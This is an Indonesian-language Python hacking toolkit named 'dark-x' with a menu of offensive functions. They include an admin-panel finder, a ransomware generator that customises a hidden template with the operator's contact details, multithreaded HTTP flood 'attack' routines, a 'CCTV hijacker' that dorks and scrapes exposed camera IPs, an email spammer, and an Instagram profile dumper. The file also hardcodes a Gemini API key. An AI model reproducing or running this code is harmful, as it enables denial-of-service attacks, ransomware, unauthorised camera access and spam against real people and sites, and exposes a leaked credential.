#!/usr/bin/python
# -*- coding: utf-8 -*-
# Recode? Boleh asalkan hargai & cantumkan author asli
# Disclaimer: Script ini tidak disusun utk tujuan kriminalitas
# -------------------------------------------------
# Thanks to       : Allah SWT
# Author/Penyusun : Shadow Xploit
# Tool            : dark-x
# Version         : 4.0.1
# Last Update     : 03-11-2024
# -------------------------------------------------

try:
    import useragent, os, sys, time, platform, requests, re, json, urllib, colorama, instaloader, random, socket, threading, cloudscraper, shutil, string
    import requests as r
    from time import sleep
    from datetime import datetime
    from instaloader import instaloader
    from colorama import Fore, Style, init
    from requests.sessions import session
    from requests.exceptions import RequestException
    from requests.exceptions import SSLError
    from rich.panel import Panel
    from rich.console import Console
    from rich import print as rprint
    from rich import print as printf
    from rich.prompt import Prompt
except (ModuleNotFoundError) as e:
    __import__('sys').exit(f"[Error] {str(e).capitalize()}!")

def admin_finder():
    website_url = input("\n\033[1;34mURL Target \033[1;31m(https://web.com) \033[1;36m: \033[0;37m")
    admin_paths = ['/admin/', '/admin/dashboard/', '/admin/login.php/', '/wp-admin/', '/login.php/', '/wp-admin.php/', '/wp-admin/index.php', '/admin/dashboard.html/', '/admin.html/', '/admin/', '/usuarios/', '/cpanel.php/', '/cpanel/', '/cpanel.htm/', '/controlpanel/', '/admin/upload.php/', '/wp-login.php/', '/administrator/', '/admin/add.php/', '/dashboard/', '/admin/dashboard/', '/admin/dashboard.php/', '/panel/', '/admin/panel/', '/adminpanel/', '/admin/controlpanel/', '/admin/cpanel/', '/admin/dashboard.php/', '/admin.html/', '/admin.php/', '/admin/cpanel.php/', '/admin/cp.php/', '/adm', '/administrator/index.html', '/panelcontrol', '/dash', '/admin/dash.php']
    
    for result in admin_paths:
        file_exists = ('.google-cookie')
        if file_exists == True:
            os.remove(file_exists)
        print(f'\033[1;34mSearching Admin Page..')
        url = website_url + result
        response = requests.get(url)
        if response.status_code == 200:
            print('\033[1;37mFound ! ')
            print(response)
            print(url)
        else:
            print('\033[1;31mCant Find Admin Page')
            print(response)   

def ransomware():
    os.system("cp .data/.t .")
    new_ransomware = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mNama Ransomware \033[1;31m(ex. fb.py) \033[1;36m: \033[0;37m")
    os.system(f"mv .t {new_ransomware}")
    file_name = new_ransomware
    with open(file_name, 'r') as file:
        data = file.read()
    new_name = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mNickname anda \033[1;36m: \033[0;37m")
    new_address = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mPassword ransomware \033[1;36m: \033[0;37m")
    new_number = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mNomor anda \033[1;31m(+62xxx) \033[1;36m: \033[0;37m")
    data = data.replace("Nick777x", new_name)
    data = data.replace("111", new_address)
    data = data.replace("+6283141494320", new_number)
    with open(file_name, 'w') as file:
        file.write(data)
    os.system(f"mv {new_ransomware} /sdcard")
    sleep(1)
    print("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mMembuat ransomware...")
    sleep(1.5)
    print(f"\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mCek file ransomware \033[0;37m'{new_ransomware}' \033[1;34mdi memori internal!")
    sleep(0.5)
    print("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mJangan lupa di enkripsi/obfuscate, biar passwordnya gak kebaca!")
    sleep(0.5)

def bot_wa():
    print("\n \033[1;31m[\033[1;37m1\033[1;31m] \033[1;36mStart Bot WhatsApp")
    print(" \033[1;31m[\033[1;37m2\033[1;31m] \033[1;36mSetting Bot")
    print(" \033[1;31m[\033[1;37m0\033[1;31m] \033[1;36mBack To Menu")
    pilihan = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mChoose \033[1;36m: \033[0;37m")
    if pilihan.endswith("1"):
        sleep(1)
        os.system("npm start")
    elif pilihan.endswith("2"):
        sleep(1)
        os.system("rm -rf servers/session")
        setting_bot()
    else:
        sleep(2)

def setting_bot():
    os.system("cp .data/config.js .")
    file_name = "config.js"
    with open(file_name, 'r') as file:
        data = file.read()
    new_bot = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mNama Bot \033[1;36m: \033[0;37m")
    new_owner = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mNama Owner \033[1;36m: \033[0;37m")
    new_number = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mNomor Owner \033[1;31m(62xxx) \033[1;36m: \033[0;37m")
    data = data.replace("Shadow Bot", new_bot)
    data = data.replace("Shadow Xploit", new_owner)
    data = data.replace("6283141494320", new_number)
    with open(file_name, 'w') as file:
        file.write(data)
    print("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mBot Telah Di Setting.")
    sleep(2)
    bot_wa()

def bot_wa_ai():
    print("\n \033[1;31m[\033[1;37m1\033[1;31m] \033[1;36mStart Bot AI WhatsApp")
    print(" \033[1;31m[\033[1;37m2\033[1;31m] \033[1;36mSetting Bot")
    #print(" \033[1;31m[\033[1;37m3\033[1;31m] \033[1;36mDelete Session")
    print(" \033[1;31m[\033[1;37m0\033[1;31m] \033[1;36mBack To Menu")
    pilihan = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mChoose \033[1;36m: \033[0;37m")
    if pilihan.endswith("1"):
        if os.path.isfile('.env'):
            os.system("rm -rf store-session.json")
            os.system("node index")
        else:
            sleep(1)
            setting_bot_ai()
    elif pilihan.endswith("2"):
        sleep(1)
        os.system("rm -rf session")
        os.system("rm -rf store-session.json")
        setting_bot_ai()
    else:
        sleep(2)

def setting_bot_ai():
    os.system("cp .data/.env .")
    file_name = ".env"
    with open(file_name, 'r') as file:
        data = file.read()
    new_bot = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mNomor Bot \033[1;31m(62xxx) \033[1;36m: \033[0;37m")
    #new_api = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mAPI Key \033[1;36m: \033[0;37m")
    #new_number = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mNomor Owner \033[1;31m(62xxx) \033[1;36m: \033[0;37m")
    data = data.replace("6283141494320", new_bot)
    #data = data.replace("AIzaSyCHPtLm00fm6A6e8fWWOB6cT5Rv_jIMHjY", new_api)
    #data = data.replace("6283141494320", new_number)
    with open(file_name, 'w') as file:
        file.write(data)
    print("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mBot Telah Di Setting.")
    sleep(2)
    bot_wa_ai()
    
def httpv1():
    import threading
    from colorama import Fore, Style, init
    init()
    def stress_test(url):
        num_threads = int(input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mRequests/second \033[1;31m(ex. 100) \033[1;36m: \033[0;37m"))
        requests_per_second = int(input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mThreads \033[1;31m(ex. 100) \033[1;36m: \033[0;37m"))
        def send_requests():
            requests_sent = 0
            session = requests.Session()
            try:
                while not stop_event.is_set():
                    session.get(url)
                    requests_sent += 1
                    print(f" \033[1;34mThread-{threading.current_thread().ident} Request {requests_sent} Berhasil" + Style.RESET_ALL)
                    sleep(1 / requests_per_second)
            except Exception as e:
                print(f" \033[1;31mThread-{threading.current_thread().ident} encountered an error: {e}")
            except KeyboardInterrupt:
                print(" \033[1;31mExiting...")
                stop_event.set()
        stop_event = threading.Event()
        threads = []
        for _ in range(num_threads):
            thread = threading.Thread(target=send_requests)
            thread.start()
            threads.append(thread)
        try:
            print("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mPress Ctr+Z to stop the attack\n")
            #Check result on https://check-host.net/check-http?host={url}\n")
        except KeyboardInterrupt:
            print(" \033[1;31mExiting...")
            stop_event.set()
        for thread in threads:
            thread.join()
    if __name__ == "__main__":
        url = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mURL \033[1;31m(ex. https://en.cis.org.il) \033[1;36m: \033[0;37m")
        if url.endswith("id"):
           sleep(1)
           print("\n \033[1;31m[\033[1;37m-\033[1;31m] \033[1;34mAkses ditolak!!!\n")
           sleep(0.5)
           sys.exit()
        else:
           stress_test(url)

def httpv3():
    import threading
    def send_request(url):
        with open('user-agents.txt', 'r') as f:
            useragents = f.readlines()
        while True:
            try:
                user_agent = random.choice(useragents).strip()
                headers = {'User-Agent': user_agent}
                response = requests.get(url, headers=headers)
                print(" \033[1;34mRespon status web :", (response.status_code))
            except requests.exceptions.RequestException as e:
                print(" \033[1;31mError :", e)

    if __name__ == "__main__":
        url = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mTarget \033[1;31m(ex. https://en.cis.org.il) \033[1;36m: \033[0;37m")
        if url.endswith("id"):
            sleep(1)
            print("\n \033[1;31m[\033[1;37m-\033[1;31m] \033[1;34mAkses ditolak!!!\n")
            sleep(0.5)
            sys.exit()
        else:
            proxy_list = open('proxy.txt', 'r').readlines()
            proxies = {'http': None, 'https': None}
            for proxy in proxy_list:
                proxies['http'] = 'http://' + proxy.strip()
                proxies['https'] = 'https://' + proxy.strip()
                for i in range(500):
                    threading.Thread(target=send_request, args=(url,)).start()

def ig():
  now = datetime.now()
  current_time = now.strftime("%H:%M:%S")
  def banner():
     print("\n\033[1;31m.::.: Coded By Mr.OwlBird05 :.::.")
  def start():
     banner()
     import instaloader, sys
     from instaloader import instaloader
     x = instaloader.Instaloader()
     try:
        print ()
        sleep(1)
        uname = input(f"\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mEnter a username instagram \033[1;31m: \033[0;37m") #INPUT USER
        if uname == "":
           print("\033[1;31m[\033[1;37m+\033[1;31m] \033[1;31mUsername tidak ditemukan!\n")
           sys.exit()
        f = instaloader.Profile.from_username(x.context,uname)
        print("\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mUsername\033[0m \033[1;31m:\033[0;37m", f.username)
        print("\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mID\033[0m \033[1;31m:\033[0;37m", f.userid)
        print("\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mNama lengkap\033[0m \033[1;31m:\033[0;37m", f.full_name)
        print("\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mBiografi\033[0m \033[1;31m:\033[0;37m", f.biography)
        print("\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mNama kategori bisnis\033[0m \033[1;31m:\033[0;37m", f.business_category_name)
        print("\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mURL eksternal\033[0m \033[1;31m:\033[0;37m", f.external_url)
        print("\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mDiikuti orang\033[0m \033[1;31m:\033[0;37m", f.followed_by_viewer)
        print("\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mMengikuti\033[0m \033[1;31m:\033[0;37m", f.followees) 
        print("\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mPengikut\033[0m \033[1;31m:\033[0;37m", f.followers)
        print("\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mMengikuti orang\033[0m \033[1;31m:\033[0;37m", f.follows_viewer)
        print("\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mDiblokir orang\033[0m \033[1;31m:\033[0;37m", f.blocked_by_viewer)
        print("\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mPernah memblokir orang\033[0m \033[1;31m:\033[0;37m", f.has_blocked_viewer)
        print("\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mPunya sorotan\033[0m \033[1;31m:\033[0;37m", f.has_highlight_reels)
        print("\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mPunya cerita publik\033[0m \033[1;31m:\033[0;37m", f.has_public_story)
        print("\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mTelah meminta orang\033[0m \033[1;31m:\033[0;37m", f.has_requested_viewer)
        print("\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mDiminta orang\033[0m \033[1;31m:\033[0;37m", f.requested_by_viewer)
        print("\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mMemiliki cerita yang dapat dilihat\033[0m \033[1;31m:\033[0;37m", f.has_viewable_story)
        print("\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mIGTV\033[0m \033[1;31m:\033[0;37m", f.igtvcount)
        print("\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mAkun bisnis\033[0m \033[1;31m:\033[0;37m", f.is_business_account)
        print("\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mAkun pribadi\033[0m \033[1;31m:\033[0;37m", f.is_private)
        print("\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mDiverifikasi\033[0m \033[1;31m:\033[0;37m", f.is_verified)
        print("\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mPostingan\033[0m \033[1;31m:\033[0;37m", f.mediacount)
        print("\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mURL foto profil\033[0m \033[1;31m:\033[0;37m", f.profile_pic_url)
        print ()

     except KeyboardInterrupt:
        print("")

     except EOFError:
        print("")
  start()

def ip_track():
    now = datetime.now()
    current_time = now.strftime("%H:%M:%S")
    print("\n\033[1;33m.::.: Coded By Mr.OwlBird05 :.::.")
    sleep(1)
    ip = input(f"\033[1;37m\nEnter IP target \033[1;31m: \033[1;33m")
    print()
    print(f'\033[0;37m============= \033[1;33mSHOW INFORMATION IP ADDRESS \033[0;37m=============')
    req_api = requests.get(f"http://ipwho.is/{ip}")
    ip_data = json.loads(req_api.text)
    sleep(2)
    print(f"\n\033[0;37mIP Target      :\033[1;33m", ip_data["ip"])
    sleep(0.1)
    print(f"\033[0;37mType IP        :\033[1;33m", ip_data["type"])
    sleep(0.1)
    print(f"\033[0;37mCountry        :\033[1;33m", ip_data["country"])
    sleep(0.1)
    print(f"\033[0;37mCountry Code   :\033[1;33m", ip_data["country_code"])
    sleep(0.1)
    print(f"\033[0;37mCity           :\033[1;33m", ip_data["city"])
    sleep(0.1)
    print(f"\033[0;37mContinent      :\033[1;33m", ip_data["continent"])
    sleep(0.1)
    print(f"\033[0;37mContinent Code :\033[1;33m", ip_data["continent_code"])
    sleep(0.1)
    print(f"\033[0;37mRegion         :\033[1;33m", ip_data["region"])
    sleep(0.1)
    print(f"\033[0;37mRegion Code    :\033[1;33m", ip_data["region_code"])
    sleep(0.1)
    print(f"\033[0;37mLatitude       :\033[1;33m", ip_data["latitude"])
    sleep(0.1)
    print(f"\033[0;37mLongitude      :\033[1;33m", ip_data["longitude"])
    sleep(0.1)
    print(f"\033[0;37mCapital        :\033[1;33m", ip_data["capital"])
    sleep(0.1)
    print(f"\033[0;37mEU             :\033[1;33m", ip_data["is_eu"])
    sleep(0.1)
    print(f"\033[0;37mPostal         :\033[1;33m", ip_data["postal"])
    sleep(0.1)
    print(f"\033[0;37mCalling Code   :\033[1;33m", ip_data["calling_code"])
    sleep(0.1)
    print(f"\033[0;37mCapital        :\033[1;33m", ip_data["capital"])
    sleep(0.1)
    print(f"\033[0;37mBorders        :\033[1;33m", ip_data["borders"])
    sleep(0.1)
    print(f"\033[0;37mCountry Flag   :\033[1;33m", ip_data["flag"]["emoji"])
    sleep(0.1)
    print(f"\033[0;37mASN            :\033[1;33m", ip_data["connection"]["asn"])
    sleep(0.1)
    print(f"\033[0;37mORG            :\033[1;33m", ip_data["connection"]["org"])
    sleep(0.1)
    print(f"\033[0;37mISP            :\033[1;33m", ip_data["connection"]["isp"])
    sleep(0.1)
    print(f"\033[0;37mDomain         :\033[1;33m", ip_data["connection"]["domain"])
    sleep(0.1)
    print(f"\033[0;37mID             :\033[1;33m", ip_data["timezone"]["id"])
    sleep(0.1)
    print(f"\033[0;37mABBR           :\033[1;33m", ip_data["timezone"]["abbr"])
    sleep(0.1)
    print(f"\033[0;37mDST            :\033[1;33m", ip_data["timezone"]["is_dst"])
    sleep(0.1)
    print(f"\033[0;37mOffset         :\033[1;33m", ip_data["timezone"]["offset"])
    sleep(0.1)
    print(f"\033[0;37mUTC            :\033[1;33m", ip_data["timezone"]["utc"])
    sleep(0.1)
    lat = (ip_data['latitude'])
    lon = (ip_data['longitude'])
    print(f"\033[0;37mMaps           :\033[1;33m https://www.google.com/maps/place/{lat},{lon}/@{lat},{lon},17z")
    sleep(0.1)
    print ()

def shadow_gpt():
    now = datetime.now()
    tahun = now.year
    bulan = now.month
    tanggal = now.strftime("%d")
    hari_angka = now.weekday()
    if hari_angka == 0:
        hari_nama = "Senin"
    elif hari_angka == 1:
        hari_nama = "Selasa"
    elif hari_angka == 2:
        hari_nama = "Rabu"
    elif hari_angka == 3:
        hari_nama = "Kamis"
    elif hari_angka == 4:
        hari_nama = "Jumat"
    elif hari_angka == 5:
        hari_nama = "Sabtu"
    else:
        hari_nama = "Minggu"

    jam = now.hour
    menit = now.minute
    detik_awal = now.second

    url = 'https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent?key=AIzaSyCHPtLm00fm6A6e8fWWOB6cT5Rv_jIMHjY'

    headers = {'Content-Type': 'application/json'}

    print("""\033[1;34m   _____ __              __              __________  ______
  / ___// /_  ____ _____/ /___ _      __/ ____/ __ \/_  __/
  \__ \/ __ \/ __ `/ __  / __ \ | /| / / / __/ /_/ / / /
 ___/ / / / / /_/ / /_/ / /_/ / |/ |/ / /_/ / ____/ / /
/____/_/ /_/\__,_/\__,_/\____/|__/|__/\____/_/     /_/
""")

    while True:
      try:
        input_text = Prompt.ask("\033[1;34mPertanyaan \033[0;37m")
        data = {
            "contents": [
                {
                    "parts": [
                        {
                            "text": input_text
                        }
                    ]
                }
            ]
        }

        detik_awal = now.second
        response = requests.post(url, headers=headers, json=data)
        result = response.json()
        detik_akhir = datetime.now().second

        for candidate in result['candidates']:
            content = candidate['content']
            if 'parts' in content:
                for part in content['parts']:
                    if 'text' in part:
                        reply_text = part['text']
                        print()
                        print(f"\033[1;34mShadow GPT \033[0;37m: {reply_text}")
                        #rprint(Panel(reply_text, title="[bold red]SHADOW GPT[/bold red]", style="white"))
                        print(f"\n\033[1;31mWaktu Respon: {tahun}/{bulan}/{tanggal}/{hari_nama}/{jam}:{menit}:{detik_akhir} - By Shadow GPT")
                        os.system(f'espeak -s 190 -a 200 -p 5 -g 5 "{reply_text}" -v id+f10')
                        break
        print()
      except KeyError:
        print("\033[1;31m[\033[1;37m!\033[1;31m] \033[1;31mKesalahan tak terduga!")
        break
      except KeyboardInterrupt:
        print("\033[1;31m[\033[1;37m!\033[1;31m] \033[1;33mProgram dihentikan!")
        break

def termux_banner():
    os.system("cp .data/.sh .")
    file_name = '.sh'
    with open(file_name, 'r') as file:
        data = file.read()
    print("\n \033[1;31m[\033[1;37m1\033[1;31m] \033[1;36mLinux")
    print(" \033[1;31m[\033[1;37m2\033[1;31m] \033[1;36mKali Linux")
    print(" \033[1;31m[\033[1;37m3\033[1;31m] \033[1;36mArch Linux")
    print(" \033[1;31m[\033[1;37m4\033[1;31m] \033[1;36mBlack Arch")
    print(" \033[1;31m[\033[1;37m5\033[1;31m] \033[1;36mDebian")
    print(" \033[1;31m[\033[1;37m6\033[1;31m] \033[1;36mUbuntu")
    print(" \033[1;31m[\033[1;37m7\033[1;31m] \033[1;36mKaOS")
    print(" \033[1;31m[\033[1;37m8\033[1;31m] \033[1;36mAndroid")
    print(" \033[1;31m[\033[1;37m9\033[1;31m] \033[1;36mMacOS")
    pilihan = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mChoose Logo \033[1;31m: \033[1;37m")
    if pilihan.endswith("1"):
        logo = "Linux"
    elif pilihan.endswith("2"):
        logo = "KaliLinux"
    elif pilihan.endswith("3"):
        logo = "ArchLinux"
    elif pilihan.endswith("4"):
        logo = "BlackArch" 
    elif pilihan.endswith("5"):
        logo = "debian" 
    elif pilihan.endswith("6"):
        logo = "ubuntu" 
    elif pilihan.endswith("7"):
        logo = "kaos"
    elif pilihan.endswith("8"):
        logo = "Android"
    elif pilihan.endswith("9"):
        logo = "MacOS"
    new_name = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mNicname \033[1;31m: \033[0;37m")
    
    #new_address = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mKomunitas \033[1;31m(ex. D A R K  X P L O I T E R) \033[1;36m: \033[0;37m")
    data = data.replace("dark", new_name)
    data = data.replace("BlackArch", logo)
    #data = data.replace("D A R K  X P L O I T E R", new_address)
    with open(file_name, 'w') as file:
        file.write(data)
    os.system("mv .sh $HOME/../usr/etc/bash.bashrc")
    sleep(1)
    print("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;36mSelesai")
    sleep(0.5)
    print("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mKetik \033[1;31mlogin \033[1;34muntuk mencoba!")

def cctv():
    from googlesearch import search
    import ipaddress
    import faker
    from faker import Faker
    global user_ip
    user_ip = Faker()
    ip_addr = user_ip.ipv4()
    ip_address = user_ip.ipv6()
    MAX_IPV4 = ipaddress.IPv4Address._ALL_ONES  # 2 ** 32 - 1
    MAX_IPV6 = ipaddress.IPv6Address._ALL_ONES  # 2 ** 128 - 1
    def randomipv4():
        return  ipaddress.IPv4Address._string_from_ip_int(
            random.randint(0, MAX_IPV4)
        )

    def randomipv6():
        return ipaddress.IPv6Address._string_from_ip_int(
            random.randint(0, MAX_IPV6)
        )
    random.seed(444)
    randomipv4()
    '79.19.184.109'
    randomipv4()
    '3.99.136.189'
    randomipv4()
    '124.4.25.53'
    randomipv6()
    '4fb7:270d:8ba9:c1ed:7124:317:e6be:81f2'
    randomipv6()
    'fe02:b348:9465:dc65:6998:6627:1300:29c9'
    randomipv6()
    '74a:dd88:1ff2:bfe3:1f3:81ad:debd:db88'    
    address = randomipv4()
    ip6 = randomipv6()

    global user_agents
    user_agents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36']
    global success, info, fail
    success, info, fail = Fore.WHITE, Fore.BLUE, Fore.RED
    
    if os.name == 'posix':  # Untuk sistem seperti Linux atau macOS
        os.system('clear')
    elif os.name == 'nt':   # Untuk sistem Windows
        os.system('cls')

    print("""\033[1;34m  _________________   __  __ ___   _          __  
 / ___/ ___/_  __/ | / / / // (_) (_)__ _____/ /_____ ____
/ /__/ /__  / /  | |/ / / _  / / / / _ `/ __/  '_/ -_) __/
\___/\___/ /_/   |___/ /_//_/_/_/ /\_,_/\__/_/\_\\__/_/ 
                             |___/ \033[1;31mBy MrSanZz""")
    lokasi = input(f'\033[1;34mLokasi/Daerah \033[1;31m: \033[0;37m')
    dork = ['inurl ', 'intext ', 'intitle ', 'cgi ', 'view.shtml']
    dorkc = ['/view.shtml', 'cctv', 'CgiStart?page=', 'liveapplet', 'Webcam.html', 'EvoCam', 'view/view.shtml', 'cctv/view.shtml', 'cctv/index.shtml', 'cctv/index.php', 'cctv/index.html']

    for cctv in dork:
            try:
                rand_user = random.choice(user_agents)
                rand_ipv4 = random.choice(address)
                rand_ipv6 = random.choice(ip6)
                print(f'\033[1;34mSearching CCTV...')
                for hijacked in search(f'{cctv}cctv {cctv}{lokasi}', tld='com', num=1, start=1, stop=None, pause=4):
                    print(f'\033[0;37mFound : ')
                    print(hijacked)
                else:
                    print(f'\033[1;31mCant find')
            except urllib.error.HTTPError as e:
                    if e.code == 429:
                        print(f'\033[1;31m[429] Too Many Request, Please Wait')
                        sleep(4)
    print('\033[1;33mCCTV Hijacker Done')

def cctv2():
    from requests.structures import CaseInsensitiveDict
    colorama.init()
    url = "http://www.insecam.org/en/jsoncountries/"
    headers = CaseInsensitiveDict()
    headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
    headers["Cache-Control"] = "max-age=0"
    headers["Connection"] = "keep-alive"
    headers["Host"] = "www.insecam.org"
    headers["Upgrade-Insecure-Requests"] = "1"
    headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"


    resp = requests.get(url, headers=headers)

    data = resp.json()
    countries = data['countries']

    print("""\033[1;31m  _________________   __  __ ___   _          __  
 / ___/ ___/_  __/ | / / / // (_) (_)__ _____/ /_____ ____
\033[1;37m/ /__/ /__  / /  | |/ / / _  / / / / _ `/ __/  '_/ -_) __/
\___/\___/ /_/   |___/ /_//_/_/_/ /\_,_/\__/_/\_\\__/_/ 
                             |___/\033[1;31mBy AngelSecurityTeam
\033[1;37mList Country Codes \033[1;31m:
""")

    for key, value in countries.items():
        print(f'\033[1;31m(\033[1;37m{key}\033[1;31m) - \033[1;37m{value["country"]} \033[1;31m/ (\033[1;37m{value["count"]}\033[1;31m)  ')
        print("")
        
    try:
        country = input("\033[1;37mCountry Code \033[1;31m(\033[1;37m##\033[1;31m) : \033[1;37m")
        res = requests.get(
            f"http://www.insecam.org/en/bycountry/{country}", headers=headers
        )
        last_page = re.findall(r'pagenavigator\("\?page=", (\d+)', res.text)[0]

        for page in range(int(last_page)):
            res = requests.get(
                f"http://www.insecam.org/en/bycountry/{country}/?page={page}",
                headers=headers
            )
            find_ip = re.findall(r"http://\d+.\d+.\d+.\d+:\d+", res.text)
    
            with open(f'{country}.txt', 'w') as f:
              for ip in find_ip:
                  print("")
                  print("\033[1;31m", ip)
                  f.write(f'{ip}\n')
    except:
        pass
    finally:
        print('\n\033[37mSave File :'+country+'.txt')

def email_sender():
    R = '\033[1;31m'
    G = '\033[1;32m'
    C = '\033[1;36m'
    W = '\033[0m'

    import time, os, random, sys, json, argparse, requests, smtplib, time
    import subprocess as subp
    import logging

    logger = logging.getLogger('dev')
    logger.setLevel(logging.INFO)

    fileHandler = logging.FileHandler('spammer.log')
    fileHandler.setLevel(logging.INFO)

    consoleHandler = logging.StreamHandler()
    consoleHandler.setLevel(logging.INFO)

    logger.addHandler(fileHandler)
    logger.addHandler(consoleHandler)

    #logger.info('Email Spammer - Started!')
    row = []
    info = ''
    result = ''
    systemR = '1.7.4'

    def update_check():
        get = requests.get("https://raw.githubusercontent.com/mishakorzik/Email-Spammer/main/src/.version").text
        get = get.replace("\n", "")
        if get == systemR:
            print(f"\033[0mINFO: \033[92mno update found.")
        else:
            print(f"\033[0mINFO: \033[91mnew version found, please update tool from\n\033[0mINFO: \033[91mgithub.com/mishakorzik/Email-Spammer")

    def exit_error():
        print(bcolors.FAIL + 'Works only with Gmail.')
        sys.exit()

    # gmail   : port = 587 , smtp_server = smtp.gmail.com
    # outlook : port = 465 , smtp_server = smtp-mail.outlook.com
    # yahoo   : port = 587 , smtp_server = smpt.mail.yahoo.com
    # hotmail : port = 587 , smtp_server = smtp-mail.outlook.com
    # Yandex  : port = 465 , smtp_server = smtp.yandex.com
    # MailRu  : port = 587 , smtp_server = smtp.mail.ru

    GMAIL_PORT = "587"
    GMAIL_SSL_PORT = "465"
    YAHOO_PORT = "587"
    OUTLOOK_PORT = "587"
    AOL_PORT = "587"
    MAILRU_PORT = "465"

    class bcolors:
            OKGREEN = '\033[1;92m'
            WARNING = '\033[1;33m'
            FAIL = '\033[1;91m'
            ENDC = '\033[0m'
            LITBU = '\033[1;94m'
            YELLOW = '\033[1;33m'
            CYAN = '\033[1;36'
            colors = ['\033[1;92m', '\033[1;91m', '\033[1;33m']
            RAND = random.choice(colors)

    class FG:
            black = "\033[1;30m"
            red = "\033[1;31m"
            green = "\033[1;32m"
            orange = "\033[1;33m"
            blue = "\033[1;34m"
            purple = "\033[1;35m"
            cyan = "\033[1;36m"
            lightgrey = "\033[1;37m"
            darkgrey = "\033[1;90m"
            lightred = "\033[1;91m"
            lightgreen = "\033[1;92m"
            yellow = "\033[1;93m"
            lightblue = "\033[1;94m"
            pink = "\033[1;95m"
            lightcyan = "\033[1;96m"

    def start_bomb():
            print('''
\033[1;31m[\033[1;37m>\033[1;31m] \033[1;34mPrepare for spam and attack ...''')
